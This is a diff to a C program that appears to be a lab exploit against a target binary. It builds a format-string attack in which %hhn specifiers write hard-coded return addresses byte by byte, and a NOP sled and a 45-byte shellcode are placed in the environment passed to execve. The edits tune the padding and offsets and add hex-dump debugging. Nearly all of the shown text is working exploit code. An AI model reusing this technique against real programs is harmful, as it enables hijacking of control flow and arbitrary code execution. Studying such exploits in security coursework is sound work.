@@ -63,14 +63,14 @@ int main(void)
     So the culmulative length is 0xfa + 39 = 289 (0x121), exceeding 1 byte in size.
     Specifier %hhn writes LSB, which is just 0x21. Same thing in the 1st calculation.
   */
-  char format_content[] = "%40x%8x%hhn%202x%hhn%39x%hhn%15x%hhn";
+  char format_content[] = "%08x%08x%08x%08x%16x%hhn%202x%hhn%39x%hhn%15x%hhn";
 
   /*
     Copy it starting from the 28th bytes of the buffer so that the format specifiers
     would start from the 60th byte of formatString[]:
     0 ~ 27 -> 28 bytes, 28 + 32 = 60 bytes -> 0 ~ 59 of formatString.
   */
-  for (int i = 0; i < 36; i++) {
+  for (int i = 0; i < 49; i++) {
     buf[28 + i] = format_content[i];
   }
 
@@ -84,7 +84,7 @@ int main(void)
     which results in 4 null bytes starting from 60th.
     Therefore another 4 bytes are used to complete the alignment as 4 + 4 = 8.
   */
-  for(int i = 0; i < 45; i++){
+  for (int i = 0; i < 45; i++) {
 		buf[112 + i] = shellcode[i];
 	}
 
@@ -95,12 +95,6 @@ int main(void)
   char ret_addr_2[] = "\x89\xf9\x21\x30";
   char ret_addr_3[] = "\x8a\xf9\x21\x30";
   char ret_addr_4[] = "\x8b\xf9\x21\x30";
-
-  // // Return address to be overwritten: 0x3021fea8 (rip within foo frame)
-  // char ret_addr_1[] = "\xa8\xfe\x21\x30";
-  // char ret_addr_2[] = "\xa9\xfe\x21\x30";
-  // char ret_addr_3[] = "\xaa\xfe\x21\x30";
-  // char ret_addr_4[] = "\xab\xfe\x21\x30";
 
   // Encode env to accommodate null bytes
   args[0] = TARGET; 
@@ -129,6 +123,10 @@ int main(void)
   env[15] = buf;
   env[16] = NULL;
 
+  for (int i = 0; i < 17; i++) {
+    print_hexcode(env[i]);
+  }
+
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
@@ -152,19 +150,19 @@ int main(void)
   \x90\x90\x90\x90
   \x90\x90\x90\x90
   \x90\x90\x90\x90
-  \x25\x34\x30\x78 <- Start of the specifiers "%40x%8x%hhn%202x%hhn%39x%hhn%15x%hhn"
-  \x25\x38\x78\x25
-  \x68\x68\x6e\x25
-  \x32\x30\x32\x78
+  \x25\x30\x38\x78
+  \x25\x30\x38\x78
+  \x25\x30\x38\x78
+  \x25\x30\x38\x78
+  \x25\x31\x36\x78
   \x25\x68\x68\x6e
-  \x25\x33\x39\x78
-  \x25\x68\x68\x6e
-  \x25\x31\x35\x78
-  \x25\x68\x68\x6e
-  \x90\x90\x90\x90 <- NOPs
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
+  \x25\x32\x30\x32
+  \x78\x25\x68\x68
+  \x6e\x25\x33\x39
+  \x78\x25\x68\x68
+  \x6e\x25\x31\x35
+  \x78\x25\x68\x68
+  \x6e\x90\x90\x90 <- NOPs
   \x90\x90\x90\x90
   \x90\x90\x90\x90
   \x90\x90\x90\x90
@@ -208,6 +206,6 @@ int main(void)
   \x90\x90\x90\x90
   \x90\x90\x90\x90
   \x90\x90\x90\x90
-  \x90\x90\x90\x90
+  \x90\x90\x90\x00
 
 */
